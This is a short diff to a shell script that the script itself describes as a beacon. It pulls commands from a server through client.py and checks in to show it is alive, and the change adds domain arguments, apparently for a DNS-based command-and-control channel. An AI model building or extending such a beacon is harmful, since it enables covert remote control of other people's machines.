@@ -9,7 +9,7 @@ f=false
 # Pull down commands from server
 pull(){
 
-    cmd=$(python client.py)
+    cmd=$(python client.py $domain -t T)
     first=$(echo $cmd | awk '{print $1}')
     if [[ $first == "file" ]]; then
         f=true
@@ -20,7 +20,7 @@ pull(){
 
 # Check in with server show beacon is still alive
 check(){
-    cmd=$(python client.py)
+    cmd=$(python client.py $chkdomain)
     echo $cmd
 }
 
